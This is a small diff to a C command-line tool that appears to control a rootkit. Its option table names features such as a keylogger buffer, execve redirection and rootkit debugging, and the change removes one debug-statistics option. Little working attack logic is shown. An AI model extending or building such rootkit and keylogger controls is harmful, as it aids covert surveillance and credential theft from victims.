@@ -20,7 +20,6 @@ static struct option long_options[] = {
 	{"unredirect-execve", 1, 0, 10},
 	{"get-keylogger-buffer", 1, 0, 11},
 	{"debug-rk", 0, 0, 12},
-	{"debug-stats", 0, 0, 13},
 	{0, 0, 0, 0}
 };
 
@@ -95,9 +94,6 @@ int main(int argc, char **argv)
 			break;
 		case 12:
 			anima_control(DEBUG_RK, NULL);
-			break;
-		case 13:
-			anima_control(DEBUG_STATS, NULL);
 			break;
 		default:
 			break;
